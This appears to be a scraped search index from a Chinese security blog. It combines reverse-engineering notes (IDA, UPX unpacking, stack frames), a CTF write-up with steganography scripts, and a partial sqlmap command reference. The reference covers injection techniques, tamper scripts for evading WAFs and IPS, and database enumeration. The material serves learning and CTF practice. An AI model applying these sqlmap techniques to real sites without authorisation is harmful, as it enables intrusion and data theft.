进入某一块地址之后，IDA可能将代码识别生成数据，我们可以按C快捷键，将其转化为代码，随后按P创建函数，之后就可以按F5进行反编译随后就根据以往的流程进行逆向。 ​ ","date":"2023-11-17","objectID":"/reverse-basis1/:0:7","series":null,"tags":["Reverse","notes"],"title":"Reverse-Basis1","uri":"/reverse-basis1/#0x7-upx脱壳处理"},{"categories":["Reverse","notes"],"content":"\r0x7 UPX脱壳处理加壳，程序的一种保护机制，防止被逆向 UPX是一种开源的压缩壳 https://github.com/upx/upx/releases 加壳可执行文件：upx.exe sample.exe 脱壳可执行文件：upx.exe -d sample.exe 手动脱壳的目标： 1.找到原始程序入口地址(OEP) 2.在原始程序入口地址处设置硬件断点(下次调试可快速进入原始代码，硬件断点不会修改数据) 进阶目标： 脱壳到文件，并修复运行 远程Linux动态调试​ 使用IDA文件夹里面的dbsrv/linux_server64，把这个文件传入Linux系统并运行(这里我用的是Ubuntu)，回到IDA程序，在调试器里面选择远程Linux动态调试，输入远程Linux的IP地址和密码即可连接(端口号一般是默认的) ​ 关于IDA远程Linux动态调试这里不做详细展开，可以百度看详细教程。 ​ ​ retn是一条返回指令，相当于C语言的return，按F4让程序执行到此位置 ​ call指令进行函数调用 这里插一句，IDA的调试快捷键 使用f7 调试的时候遇到方法体的时候会进入到方法体内部 每个方法依次执行 使用f8 调试的时候 遇到方法体不会进入方法内部 只会依次执行 使用f9 调试的时候 只会执行 打断点的地方 OKAY，我们貌似找到了真正程序的入口 按F7跳转入该方法内部查看 ​ 进入某一块地址之后，IDA可能将代码识别生成数据，我们可以按C快捷键，将其转化为代码，随后按P创建函数，之后就可以按F5进行反编译随后就根据以往的流程进行逆向。 ​ ","date":"2023-11-17","objectID":"/reverse-basis1/:0:7","series":null,"tags":["Reverse","notes"],"title":"Reverse-Basis1","uri":"/reverse-basis1/#远程linux动态调试"},{"categories":["Reverse","notes"],"content":"reverse基础2 ","date":"2023-11-17","objectID":"/reverse-basis2/:0:0","series":null,"tags":["Reverse","notes"],"title":"Reverse-Basis2","uri":"/reverse-basis2/#"},{"categories":["Reverse","notes"],"content":"\r0x1 基本汇编指令 mov A B 将B的值复制到A里面去 push A 将A压栈 pop A 将A从栈中弹出来 call Funtion 跳转到某函数 ret –\u003e 相当于 pop ip 从栈中pop出一个值放到EIP里面 je jz **如果ZF（0标志位）=1，就跳转，否则跳过这条语句，执行下面的语句。 ","date":"2023-11-17","objectID":"/reverse-basis2/:0:1","series":null,"tags":["Reverse","notes"],"title":"Reverse-Basis2","uri":"/reverse-basis2/#0x1-基本汇编指令"},{"categories":["Reverse","notes"],"content":"\r0x2 栈\u0026栈帧​ 堆栈，就是计算机暂时储存的地方，固定的一端称之为栈底，变化的一端称之为栈顶 ​ 栈的原则：先进后出，后进先出 ​ 栈帧也叫过程活动记录，是编译器用来实现过程/函数调用的一种数据结构。 ​ C语言中，每个栈帧对应着一个未运行完的函数。栈帧中保存了该函数的返回地址和局部变量。 ​ 函数每次调用，都有它自己独立的栈帧。栈帧中维持着函数调用所需要的各种信息，包括函数的传入，函数的局部变量、函数执行完成后下一步要执行的指令地址、寄存器信息等。 ","date":"2023-11-17","objectID":"/reverse-basis2/:0:2","series":null,"tags":["Reverse","notes"],"title":"Reverse-Basis2","uri":"/reverse-basis2/#0x2-栈栈帧"},{"categories":["Reverse","notes"],"content":"\r0x3 运行时栈​ 栈帧使用了栈这一数据结构，达到了后进先出(First In Last Out)的内存管理原则。不管是插入数据还是删除数据，都是在栈顶进行的。 ​ x86-64的栈由高地址向低地址增长，寄存器rbp指向当前栈帧的底部(高地址)，寄存器rsp指向当前栈帧的顶部(低地址)。数据压栈和出栈会修改rsp的值。通过push指令将数据存入栈中，同时64位系统中会对栈顶指针做减法操作rsp=rsp-8。pop指令是push的逆操作，它将数据从栈中读取出来，同时64位系统中会对栈顶指针做加法操作rsp=rsp+8 ​ 当过程P调用过程Q时， ​ 1.把实参压栈，cdecl是gcc的默认调用约定，实参压栈顺序为从右至左 ​ 2.把返回地址(即P调用Q后的下一条指令地址)压入栈中，表示当Q返回后，P程序下一步要从那条指令开始运行 ​ 3.开始调用Q，首先将P的栈底rbp压栈，然后栈顶rsp赋值给rbp，从而形成新的栈底地址。我们再看函数调用的汇编代码时，经常看到的一段正是在做这个操作 push rbp mov rbp,rsp ​ 4.分配局部变量空间，开始具体执行Q函数的指令代码 ","date":"2023-11-17","objectID":"/reverse-basis2/:0:3","series":null,"tags":["Reverse","notes"],"title":"Reverse-Basis2","uri":"/reverse-basis2/#0x3-运行时栈"},{"categories":["Reverse","notes"],"content":"\r0x3 转移控制​ 将控制从函数P转移到函数Q只需要将程序计数器(PC)设置为Q函数代码的起始位置。另外，稍后从Q返回时处理器还需要继续执行P的下一条指令A。在x86-64中，这个过程是用执行call Q指令来完成的。该指令将A的地址压栈，并将PC设置为Q的起始地址。 ​ Q执行完成后弹出A地址这个过程是通过ret指令完成的，它会弹出地址A，并把PC设置为A #include\u003ciostream\u003e #include\u003cstdint.h\u003e int32_t Add(int32_t x,int32_t y) { int32_t z=0; z=x+y; return z; } int main() { int32_t a=10; int32_t b=20; int32_t ret=Add(a,b); return 0; } 经过编译后，再进行反汇编，如下是汇编代码 #include\u003ciostream\u003e #include\u003cstdint.h\u003e int32_t Add(int32_t x,int32_t y) // push rbp // mov rbp, rsp // mov DWORD PTR [rbp-20], edi // mov DWORD PTR [rbp-24], esi { int32_t z=0; // mov DWORD PTR [rbp-4], 0 z=x+y; // mov edx, DWORD PTR [rbp-20] // mov eax, DWORD PTR [rbp-24] // add eax, edx // mov DWORD PTR [rbp-4], eax return z; // mov eax, DWORD PTR [rbp-4] } // pop rbp // ret int main() { // push rbp // mov rbp, rsp // sub rsp, 16 int32_t a=10; // mov DWORD PTR [rbp-4], 10 int32_t b=20; // mov DWORD PTR [rbp-8], 20 int32_t ret=Add(a,b); // mov edx, DWORD PTR [rbp-8] // mov eax, DWORD PTR [rbp-4] // mov esi, edx // mov edi, eax // call Add(int, int) // mov DWORD PTR [rbp-12], eax return 0; } 当main函数调用了add时，执行了以下步骤： Add(int, int): // 5. 将main函数的栈帧底部地址入栈保存 push rbp // 6. 将此时的栈帧顶部地址作为Add函数的栈帧底部地址 mov rbp, rsp // 7. 获取形参x mov DWORD PTR [rbp-20], edi // 8. 获取形参y mov DWORD PTR [rbp-24], esi // 9. 初始化z=0 mov DWORD PTR [rbp-4], 0 // 10. 将x和y分别保存至寄存器edx和eax，然后相加，结果保存在寄存器eax mov edx, DWORD PTR [rbp-20] mov eax, DWORD PTR [rbp-24] add eax, edx // 11. 将寄存器eax中的x和y相加结果赋值给z mov DWORD PTR [rbp-4], eax // 12. 将Add函数结果z保存至寄存器eax mov eax, DWORD PTR [rbp-4] // 13. 将之前保存的main函数栈帧底部地址出栈并保存至rbp pop rbp // 14. 相当于pop eip 将之前保存的mov DWORD PTR [rbp-12], eax指令地址出栈并保存至eip ret main: push rbp mov rbp, rsp sub rsp, 16 // 1. 初始化a=10 mov DWORD PTR [rbp-4], 10 // 2. 初始化b=20 mov DWORD PTR [rbp-8], 20 // 3. 分别将a和b保存至寄存器eax和edx，再分别拷贝至寄存器edi和dsi mov edx, DWORD PTR [rbp-8] mov eax, DWORD PTR [rbp-4] mov esi, edx mov edi, eax // 4. 等价于两条命令 // ① push eip 将eip中存储的下一条指令地址压栈，即mov DWORD PTR [rbp-12], eax这条指令 // ② jmp Add(int,int) 跳转至Add(int,int) call Add(int, int) // 15. 将Add函数返回结果保存至ret mov DWORD PTR [rbp-12], eax ","date":"2023-11-17","objectID":"/reverse-basis2/:0:4","series":null,"tags":["Reverse","notes"],"title":"Reverse-Basis2","uri":"/reverse-basis2/#0x3-转移控制"},{"categories":["wp"],"content":"2022SkyNICO CTF三校联赛wp ","date":"2023-11-17","objectID":"/skynico2022.11/:0:0","series":null,"tags":["wp"],"title":"SkyNICO2022.11三校联赛","uri":"/skynico2022.11/#"},{"categories":["wp"],"content":"\r【Misc福利题】sign sign sign签到题不必多说了，扫描二维码复制字符串，放进[随波逐流]一键base 但一定要注意，要把字符串复制全，别漏了末尾的等号(可能三个) ","date":"2023-11-17","objectID":"/skynico2022.11/:1:0","series":null,"tags":["wp"],"title":"SkyNICO2022.11三校联赛","uri":"/skynico2022.11/#misc福利题sign-sign-sign"},{"categories":["wp"],"content":"\r[Misc]幸亏开着wiresharktips:Wanna有个HID键盘和Cisco交换机 下载附件之后，解压发现有个txt后缀的文件和png文件，都显然不是既定后缀文件，放进010edits，查看文件头和ASCII转码显示的字符，发现那个那个所谓的txt文件是一个7z压缩包，而那个png文件 其实题目名称已经有暗示了，直接拖进wireshark 同时我也对该题进行了百度，数据协议:USB，是抓取的键盘流量，下载相关脚本，但怎么也跑不出来，经过了许久地反复横跳，我发现了问题所在，本次题目文件中有些许冗杂的数据，阻碍了脚本的运行 删掉他们重新导出pcapng数据，只保留一下信息 重新跑脚本，得到了压缩包密码：where is you 解压后得到了一个文本文件，系Cisco交换机配置文件 好骚的题，复制那堆emoji表情进行解码，得到hint，解码password7可得flag 随后去搜索，Cisco交换机加密方式， 看到了7！一眼丁真，在线网站直接解密 ","date":"2023-11-17","objectID":"/skynico2022.11/:2:0","series":null,"tags":["wp"],"title":"SkyNICO2022.11三校联赛","uri":"/skynico2022.11/#misc幸亏开着wireshark"},{"categories":["wp"],"content":"\r【Misc福利题】啊吧啊吧也算是签到题吧，发送到foremost进行分解，然后OCR提取flag，同时遇到了一个问题，flag死活不对，原因系相似字符混淆注意。一定要注意形似字符区分(好丢nian) lI| lI| 不同字体会有不一样的显示 ","date":"2023-11-17","objectID":"/skynico2022.11/:3:0","series":null,"tags":["wp"],"title":"SkyNICO2022.11三校联赛","uri":"/skynico2022.11/#misc福利题啊吧啊吧"},{"categories":["wp"],"content":"\r[Misc]Pixels In Picture放大仔细看，有隐写的像素点，就叫他像素点隐写吧，也没啥太好的办法，拉进ps或者lr， 我的办法是，能直接读的就读，看不清就拉参数，结合lr和Stegsolve多生成几张对比着看 愣看，不知道师傅们有什么更好的方法。 ","date":"2023-11-17","objectID":"/skynico2022.11/:4:0","series":null,"tags":["wp"],"title":"SkyNICO2022.11三校联赛","uri":"/skynico2022.11/#miscpixels-in-picture"},{"categories":["wp"],"content":"\r[Misc]希尔伯特的微笑当你跳跃维度，希尔伯特在向你微笑，从alpha的角度看去，在希尔伯特曲线中领悟真谛，上下颠倒，在Quine中，发现隐藏在空白之下的秘密 真不好意思，这个题被我做成社工题了， 摘自：https://www.anquanke.com/post/id/244533 题目描述：“三体人要入侵地球了，听说他们要使出最厉害的武器” 打开图片，发现有三个重复的图形，下面有”DIFOIL”字样，再下面好像还有一串字，但看不清楚。 图片看起来很奇怪，三个图形也呼应了“ThreeBody”的题目名称。 对于图片题目常规操作，使用StegSolve查看各图层，能发现两张隐藏的图片，其他图层再没有什么可疑的东西了： 图片上能认出半个星球、一个宇航员、一只手，以及《三体》中经典的一句话“你们都是虫子”。 对三体比较熟悉的同学可能可以猜出这张图以及原始图片是三体人使用二向箔对地球进行降维打击的场景。 这里也是小小地调侃了一下选手。如果不能找到通往下一步的方法，便只能停留在这里，被三体人嘲讽为“虫子”。 让我们再回到原始图片，放大看其中的细节： 可见图片中红黄蓝绿交错，有老式电视像素点的感觉。 通过010Editor查看像素点数值： 可见相邻像素点的RGB值都差异巨大，正常情况下相邻像素点的RGB值应该差不多才对。 再仔细观察可以发现，如果以4为周期的话相邻像素的数值就差不多了，考虑正常情况下该图片的像素点应该是每4个一组。相当于原始图片是四维的，这里被“降维打击”成了三维。我们这里需要做的，便是对图片进行升维处理。 BMP格式的头部有个字节是控制每个像素点所占的比特数，现在为24，也就是3个字节，我们将这个字段改为4个字节对应的32： biBitCount 保存后重新打开图片，便可以看到正常的图形了： 再次通过StegSolve进行查看，可以发现隐藏图片： 很多人看到“Welcome to QWB”可能就放松了警惕，以为这是一张随便放的没啥用的图片，便去找其他线索了。在CTF题目中忽视作者所给的线索是大忌，其实这里是非常关键的，所以在比赛过程中我有提示“所有图片的内容都是有意义的”。 其实细心的话可以看到左上角有一些小白点，代表着那里隐藏着一些信息。使用StegSolve的Data Extract功能查看该空间： 可以看到有“Who am I?”的字样。 再以列为方式查看： 可以看到有“David”字样。 根据这张照片和“David”的提示，通过一番搜索可得知这一位是知名的数学家大卫·希尔伯特： 不过除此之外我们得不到更多的信息了。Flag在哪呢？ 让我们再用010Editor查看修改后的图片： 可以看到每个像素除了有RGB三个字段外还有一个字段，代表图片还有另一个通道。 rgbReserved 这个字段有些跟是一样的，但也有一些有细微差异。 rgbBlue 信息会不会就隐藏在字段呢？ rgbReserved 字段是有数值的，所以该通道肯定有对应的图形，不过刚才通过StegSolve并没有看到该通道。 rgbReserved 这里一个方法是修改BMP的文件头，使得StegSolve把该通道识别为Alpha通道。 不过这个可能需要了解一些BMP头相关的知识。这里采用一个更为暴力的方法，通过一个Python脚本解析BMP文件结构，把的数值复制给： rgbReserved rgbBlue with open(’threebody.bmp’, ‘rb’) as f: d = f.read()w = 580h = 435b = 4l = bytearray(d)off = l[10]for i in range(h): for j in range(w): l[off+jb+ibw] = l[off+jb+ibw+3]with open(’threebody_new.bmp’, ‘wb’) as f: f.write(l) 再通过StegSolve进行查看，可以发现另一个隐藏的图形： 可见中间是一个黑白相间的正方形，其中左上角部分比其他部分颜色要深一些。 大家肯定能想到这里的黑白便是01序列，所以这是一个二维的二进制数组。考虑将这些二进制数组逐行保存成二进制文件，无果，并且如果是逐行保存的话不应该出现左上角的区域与其他区域密度明显不同的情况。 那这个二维数组里的信息是如何储存的呢？ 这又要回到刚才提到的数学家希尔伯特了。希尔伯特提出过一种希尔伯特曲线，是一个高维到低维的映射。我们现在得到的二维二进制数组，可以通过这种方式进行降维处理转化成一串一维的二进制流。 并且，希尔伯特曲线的一个特性便是如果从低维还原成高维，则低维中相邻的点在高维中也是相邻的。这就解释了为什么会出现某一块区域密度与其他区域密度不同的情况。 不过从希尔伯特想到希尔伯特曲线可能并不十分容易，希尔伯特作为一位伟大的数学家一生的成就太多了，希尔伯特曲线可能只是其中不起眼的一个成就。 为了防止大家卡在这里，我在比赛中放出了另一个提示“不要埋头做，根据已有信息合理使用搜索引擎”。 这其实是一个大家都明白的道理，做CTF题目，尤其是做Misc题目的时候，善用搜索引擎是非常关键的一步。 但如果单纯搜索“希尔伯特”的话可能需要翻阅大量的网页，这里就需要大家有一些更加跳跃性的思维了。还记得这个题目的主体是什么吗？没错，是“三体”。那三体与希尔伯特这两个看似风马牛不相及的名词，会不会有某种联系呢？事实上，如果尝试以“三体 希尔伯特”作为关键词进行搜索， 很容易搜索引发这道题的出题思路的文章： https://mp.weixin.qq.com/s/IOSGOJnGyiGoD8J1ITQJlg 这篇文章用文字和图片介绍了三个月前B站的一期关于降维打击的视频，视频当时还小火了一把。没错，降维打击！这不正是题目里的图片所讲述的故事。如果你看了文章会发现两张隐藏的图片都能在文章中的视频截图里找到。当发现这一点之后便可以确定，这个视频肯定跟这个题目有着密切的关系。而这个视频，讲的恰恰就是希尔伯特曲线。 下面要做的就是如何利用希尔伯特曲线把这里的二维数据转化成一维数据了。 不同维度的希尔伯特曲线是这样的： 因为这里我们得到的是128128的矩阵，128=2*7，所以我们应该使用7维的希尔伯特矩阵。 然后通过希尔伯特曲线的排列方式抽取各像素点的值，视频里已经给我们展示了，类似这样： 我们可以使用脚本把二维的01矩阵降维成一维的二进制流，便可以得到隐藏的文件。我在写脚本处理图片的时候用到了 https://github.com/galtay/hilbertcurve 这个库，实现的代码为： import numpy as npfrom PIL import Imagefrom hilbertcurve.hilbertcurve import HilbertCurvewith Image.open('threebody_new.bmp') as img: arr = np.asarray(img)arr = np.vectorize(lambda x: x\u00261)(arr[:,:,2])for x1 in range(np.size(arr,0)): if sum(arr[x1])\u003e0: breakfor x2 in reversed(range(np.size(arr,0))): if sum(arr[x2])\u003e0: breakfor y1 in range(np.size(arr,1)): if sum(arr[:,y1])\u003e0: breakfor y2 in reversed(range(np.size(arr,1))): if sum(arr[:,y2])\u003e0: breakarr = arr[x1:x2+1, y1:y2+1]hilbert_curve = HilbertCurve(7, 2)s = ''for i in range(np.size(arr)): [x,y] = hilbert_curve.point_from_distance(i) s += str(arr[127-y][x])with open('output', 'wb') as f: f.write(int(s,2).to_bytes(2048, 'big')) 这里的便是最后得到的文件，打开可以发现是一个C语言程序。编译并执行这个C语言程序，发的输出结果便为该C语言程序本身。 output 其实这种可以打印自身的程序学名叫Quine，2015年第一届强网杯的NESTING DOLL题目便是关于Qunie的，这里也是小小地纪念一下当年打CTF的时光。 不过如果对原始代码和程序输出的代码进行仔细比对的话可以发现，两者并不是完全相同的，在output的第11行后面多出了大片的空白字符，由空格和Tab构成。 通过把空格替换成0、Tab替换成1，可得到字符串 01100110011011000110000101100111011110110100010000110001011011010100010101101110001101010110100100110000011011100100000101101100010111110101000001110010001100000011011000110001011001010110110101111101 这段二进制串还原便可得到Flag：flag{D1mEn5i0nAl_Pr061em} ","date":"2023-11-17","objectID":"/skynico2022.11/:5:0","series":null,"tags":["wp"],"title":"SkyNICO2022.11三校联赛","uri":"/skynico2022.11/#misc希尔伯特的微笑"},{"categories":["wp"],"content":"\r[Pwn]真的nc上去就有flag了算是pwn签到题吧，直接nc ","date":"2023-11-17","objectID":"/skynico2022.11/:6:0","series":null,"tags":["wp"],"title":"SkyNICO2022.11三校联赛","uri":"/skynico2022.11/#pwn真的nc上去就有flag了"},{"categories":["wp"],"content":"\r【Web福利题】某真实渗透场景我真的会谢！ 我以为会是SQL注入，直到hint放出。。。。。 我真的会谢。。。。 ","date":"2023-11-17","objectID":"/skynico2022.11/:7:0","series":null,"tags":["wp"],"title":"SkyNICO2022.11三校联赛","uri":"/skynico2022.11/#web福利题某真实渗透场景"},{"categories":["wp"],"content":"\r[Reverse]what_is_pyc先百度啥叫pyc，什么是pyc文件 pyc是一种二进制文件，是由Python文件经过编译后所生成的文件，它是一种byte code，Python文件变成pyc文件后，加载的速度有所提高，而且pyc还是一种跨平台的字节码，由python的虚拟机来执行的，就类似于JAVA或者.NET的虚拟机的概念。pyc的内容与python的版本是相关的，不同版本编译后的pyc文件是不同的，例如2.5版本编译的是pyc文件，而2.4版本编译的python是无法执行的 就知道他是经过.py编译过来的就行，百度pyc反编译 发现python反编译在线网站https://tool.lu/pyc/ 生成然后复制，对脚本稍加修改，get flag ","date":"2023-11-17","objectID":"/skynico2022.11/:8:0","series":null,"tags":["wp"],"title":"SkyNICO2022.11三校联赛","uri":"/skynico2022.11/#reversewhat_is_pyc"},{"categories":["wp"],"content":"\r[Forensic]芝麻开门！解开附件压缩包得到Windows7_research-cl1.vmdk是VM虚拟机磁盘镜像，用AXIOM Process进行取证，选择磁盘镜像取证，等软件读完数据直接检索pas，flag等关键词，直接get flag ","date":"2023-11-17","objectID":"/skynico2022.11/:9:0","series":null,"tags":["wp"],"title":"SkyNICO2022.11三校联赛","uri":"/skynico2022.11/#forensic芝麻开门"},{"categories":["wp"],"content":"\r[Web]Intranet！\r放到浏览器，没查到啥，直接扫目录 dirsearch结果： get shell ","date":"2023-11-17","objectID":"/skynico2022.11/:10:0","series":null,"tags":["wp"],"title":"SkyNICO2022.11三校联赛","uri":"/skynico2022.11/#webintranet"},{"categories":["manual"],"content":"sqlmap常用命令手册 ","date":"2023-11-17","objectID":"/sqlmap_common_commands/:0:0","series":null,"tags":["manual"],"title":"sqlmap常用命令","uri":"/sqlmap_common_commands/#"},{"categories":["manual"],"content":"\rsqlmap简介： sqlmap是一款开源免费的漏洞检查、利用工具. 可以检测页面中get,post参数,cookie,http头等. 可以实现数据榨取 可以实现文件系统的访问 可以实现操作命令的执行 还可以对xss漏洞进行检测 ","date":"2023-11-17","objectID":"/sqlmap_common_commands/:1:0","series":null,"tags":["manual"],"title":"sqlmap常用命令","uri":"/sqlmap_common_commands/#sqlmap简介"},{"categories":["manual"],"content":"\rsqlmap 支持5种漏洞检测类型: 基于布尔的盲注检测 (如果一个url的地址为xxxx.php?id=1,那么我们可以尝试下的加上 and 1=1(和没加and1=1结果保持一致) 和 and 1=2(和不加and1=2结果不一致),则我们基本可以确定是存在布尔注入的. ) 基于时间的盲注检测(和基于布尔的检测有些类似.通过mysql的 sleep(int)) 来观察浏览器的响应是否等待了你设定的那个值 如果等待了,则表示执行了sleep,则基本确定是存在sql注入的 基于错误的检测 (组合查询语句,看是否报错(在服务器没有抑制报错信息的前提下),如果报错 则证明我们组合的查询语句特定的字符被应用了,如果不报错,则我们输入的特殊字符很可能被服务器给过滤掉(也可能是抑制了错误输出.)) 基于union联合查询的检测(适用于如果某个web项目对查询结果只展示一条而我们需要多条的时候 则使用union联合查询搭配concat还进行获取更多的信息) 基于堆叠查询的检测(首先看服务器支不支持多语句查询,一般服务器sql语句都是写死的,某些特定的地方用占位符来接受用户输入的变量,这样即使我们加and 也只能执行select(也不一定select,主要看应用场景,总之就是服务端写了什么,你就能执行什么)查询语句,如果能插入分号;则我们后面可以自己组合update,insert,delete等语句来进行进一步操作) ","date":"2023-11-17","objectID":"/sqlmap_common_commands/:2:0","series":null,"tags":["manual"],"title":"sqlmap常用命令","uri":"/sqlmap_common_commands/#sqlmap-支持5种漏洞检测类型"},{"categories":["manual"],"content":"\roption类：　sqlmap –version 查看sqlmap版本信息. -h　查看功能参数(常用的) -hh　查看所有的参数 (如果有中文包 就最好了) -v　显示更详细的信息 一共7级, 从0-6.默认为1, 数值越大,信息显示越详细. ​ Target(指定目标): -d　直接连接数据库侦听端口,类似于把自己当一个客户端来连接. -u　指定url扫描,但url必须存在查询参数. 例: xxx.php?id=1 -l　指定logfile文件进行扫描,可以结合burp 把访问的记录保存成一个log文件, sqlmap可以直接加载burp保存到log文件进行扫描 -x　以xml的形式提交一个站点地图给sqlmap(表示不理解..) -m　如果有多个url地址,可以把多个url保存成一个文本文件 -m可以加载文本文件逐个扫描 -r　把http的请求头,body保存成一个文件 统一提交给sqlmap,sqlmap会读取内容进行拼接请求体 -g　利用谷歌搜索引擎搭配正则来过滤你想要的 -c　加载配置文件,配置文件可以指定扫描目标,扫描方式,扫描内容等等.加载了配置文件sqlmap就会根据文件内容进行特定的扫描 ","date":"2023-11-17","objectID":"/sqlmap_common_commands/:3:0","series":null,"tags":["manual"],"title":"sqlmap常用命令","uri":"/sqlmap_common_commands/#option类"},{"categories":["manual"],"content":"\r扫描类型：","date":"2023-11-17","objectID":"/sqlmap_common_commands/:4:0","series":null,"tags":["manual"],"title":"sqlmap常用命令","uri":"/sqlmap_common_commands/#扫描类型"},{"categories":["manual"],"content":"\rget扫描：　-u 指定一个带参数的url地址进行扫描. -p 只对特定的参数进行扫描(我们知道,page等是用不到的,在这串url中,只有password和username是有价值的信息,所以我们只对username进行扫描) ","date":"2023-11-17","objectID":"/sqlmap_common_commands/:4:1","series":null,"tags":["manual"],"title":"sqlmap常用命令","uri":"/sqlmap_common_commands/#get扫描"},{"categories":["manual"],"content":"\rpost扫描：sqlmap 支持2种post 扫描： 1.请求文件. 2.busp suite log文件 对于第一种请求文件扫描，将bp的抓包流量保存到txt，然后： sqlmap -r request.txt -f 另一种就是通过加载burp suite的日志文件进行扫描注入： sqlmap -l xxx.txt -f --dbs ... ","date":"2023-11-17","objectID":"/sqlmap_common_commands/:4:2","series":null,"tags":["manual"],"title":"sqlmap常用命令","uri":"/sqlmap_common_commands/#post扫描"},{"categories":["manual"],"content":"\rRequest类参数：　–data　提交的时候要携带的参数. (get,post通用,最简单的post请求方式).　–users　获取数据库用户 –dbs　获取所以数据库 –param-del　变量分隔符,默认为\u0026, –cookie　设置cookie头 –user-agent　指定user-agent(防止对方服务器侦测到) –random-agent　随机agent –host　指定host头 –level　安全级别 (1-5, \u003e=3,检测anent,\u003e=5,检测host头) –referer　指定referer头(level \u003e=3才检测) –headers　指定额外的headers请求头(多个必须使用换\\n,首字母必须大写) –method　指定请求方式, 默认为get,get请求不成功尝试post –auth-type　身份认证类型 (Basic,Digest,NTLM) , –auth-cred　身份认证账号密码 “username:password” , 完整demo: http://xxx.php?id=1 –auth-type Basic –auth-cred “u:p” (个人认为不常用) –auth-cert / –auth-file　基于客户端证书进行校验,(个人感觉非常非常非常之不常用,略过…嘿嘿,放肆一把,就不学这个了)　–proxy　指定代理 –proxy-cred　指定代理的账号密码(代理需要账号密码的前提下) –ignore-proxy　忽略系统代理(我们设置的代理都是通过浏览器进行设置的,通常用于扫描本地系统) –delay　每次请求的延迟时间,单位秒,默认无延迟. –timeout　请求超时时间,默认30秒. –retries　连接超时重试次数 ,默认3次 –randomize　长度,类型与原始值保持一致的情况下,指定每次请求随机取值的参数名 例: xxx.php?id=100, –randomize=‘‘id\" 则id的值在100-999随机出现 –scope　过滤日志内容,通过正则筛选扫描对象. 例: sqlmap -l burp.log –scope=\"(www)?.aaa.(com|net|org)\" 则只会扫描以www开头.aaa.com或者net或者org –safe-url \\ –safe-freq 扫描的时候回产生大量的url,服务器可能会销毁session.每发送–safe-freq 次注入请求后 就发送一次正常请求. –safr-url　需要扫描的url. –safe-freq　出现错误(或者说带sql注入请求)的次数 –skip-urlencode　get请求会对url进行编码. 某些web服务器不遵循标准编码 此参数就是不对get请求的url进行编码 –eval　每次请求前指定执行特定的python代码. ","date":"2023-11-17","objectID":"/sqlmap_common_commands/:5:0","series":null,"tags":["manual"],"title":"sqlmap常用命令","uri":"/sqlmap_common_commands/#request类参数"},{"categories":["manual"],"content":"\rsqlmap之cookie应用：对本机dvwa进行sql漏洞扫描. 首先登录 登录过之后,在浏览器内获取cookie信息. 复制cookie信息到sqlmap ,多个cookie之间用分号间隔分开 ","date":"2023-11-17","objectID":"/sqlmap_common_commands/:5:1","series":null,"tags":["manual"],"title":"sqlmap常用命令","uri":"/sqlmap_common_commands/#sqlmap之cookie应用"},{"categories":["manual"],"content":"\rOptimization(参数优化)：​ -0　后续3个参数的集合(除–threads) –predict-output　根据检测方法,比对返回值和统计表(/sqlmap/common-outputs.txt)内容,不断缩小检测范围,提高检测效率.(比对信息包括但不限于版本名,用户名,密码,表名,列名..等,与–threads参数不兼容) –keep-alive　使用http(s)长连接,新能好, 与–proxy参数不兼容.长连接避免重复简历连接的网络开销,但大量长连接会严重占用服务器资源 –null-connection　只获取相应页面的大小值,而非页面具体内容.通常用于盲注判断真/假,降低网络带宽消耗. 与–text-only(基于页面内容的比较判断)不兼容 –threads　最大并发线程,默认为1个线程,建议不要超过10个线程,否则可能影响站点可用性.与–predict-output参数不兼容 ","date":"2023-11-17","objectID":"/sqlmap_common_commands/:6:0","series":null,"tags":["manual"],"title":"sqlmap常用命令","uri":"/sqlmap_common_commands/#optimization参数优化"},{"categories":["manual"],"content":"\rInjection(参数注射)：　-p　扫描指定的参数,例 xxx.php?id=2\u0026name=root -p id 只会扫描id变量的值 (可以指定多个变量名,多个变量名逗号隔开) (在使用-p的时候会使–level失效,例如–level=3的时候才会扫描user-agent,但是我们使用手动指定了扫描参数user-agent 虽然没有指定–level=3,但此时也会扫描) –skip　排除指定的参数,例如–level=3 会扫描user-agent 但是我们不希望扫描useragent 可以使用–skip跳过此参数的扫描 –dbms　指定后端数据库,在已知web应用的数据库前提下,略去sqlmap扫描判断后端数据库过程,提高效率.例: –dbms=“mysql”(\u003c5.0\u003e指定版本) –os　指定目标操作系统 –invalid-bignum/ –invalid-logical 默认使用负值使参数失效,bignum使用最大参数值使参数失效,logical使用布尔判断值使取值失效 –no-cast　榨取数据时,sqlmap将所有结果转换为字符串,默认用空格替换null, 老版本可能不支持空格替换,使用–no-cast关闭替换 –no-escape　不逃逸,也就是说当payload中用丹壹号界定字符串时,sqlmap使用char()编码逃逸的方法替换字符串,也就是说不然sqlmap对payload中　的单引号进行编码 –prefix/ –suffix　前缀/后缀　–tamper　混淆脚本,用于绕过应用层过滤,IPS,WAF. 编写好的脚本存放于(sqlmap/tamper/…)使用的时候直接写出脚本名称即可,sqlmap会 自动去对应文件夹加载对应的文件　","date":"2023-11-17","objectID":"/sqlmap_common_commands/:7:0","series":null,"tags":["manual"],"title":"sqlmap常用命令","uri":"/sqlmap_common_commands/#injection参数注射"},{"categories":["manual"],"content":"\rDetection(检测)：　–level　检测级别,默认1级. 可设定1-5.级别不同,检测的细度不同./sqlmap/xml/payloads(检测级别不同,发送的payloads不同,) –risk　风险级别 1-4 默认1, 如果指数过高,可能会对数据造成伤害(如:更新,删除等) ","date":"2023-11-17","objectID":"/sqlmap_common_commands/:8:0","series":null,"tags":["manual"],"title":"sqlmap常用命令","uri":"/sqlmap_common_commands/#detection检测"},{"categories":["manual"],"content":"\rTechniques(检测sql漏洞存在的技术类型)：　就是之前提到的sqlmap的五种检测类型, 默认是全部使用, 也可以手动指定. –time-sec　基于时间的注入检测相应延迟时间(默认5秒) –union-cols　默认联合查询1–10列,随着–level增加 最多检查50列.可以手动指定. –union-char　联合查询默认使用null,可能会出现失败,此时可以手动指定数值. 例: union select null union select 1111 –dns-domain　如果攻击了dns服务器,使用此功能可以提高数据榨取速度 ","date":"2023-11-17","objectID":"/sqlmap_common_commands/:9:0","series":null,"tags":["manual"],"title":"sqlmap常用命令","uri":"/sqlmap_common_commands/#techniques检测sql漏洞存在的技术类型"},{"categories":["manual"],"content":"\rFingerprint(指纹信息)：　-f(–fingerprint)　数据库管理系统的指纹信息(数据库类型,操作系统,架构,补丁等) -b (–banner)　banner信息 ","date":"2023-11-17","objectID":"/sqlmap_common_commands/:10:0","series":null,"tags":["manual"],"title":"sqlmap常用命令","uri":"/sqlmap_common_commands/#fingerprint指纹信息"},{"categories":["manual"],"content":"\rEnumeration(枚举)：　–current-user　查询当前数据库管理系统账号 –current-db　查询当前数据库昵称 –hostname　查询当前主机名 –users　查询数据库系统中所有的账号 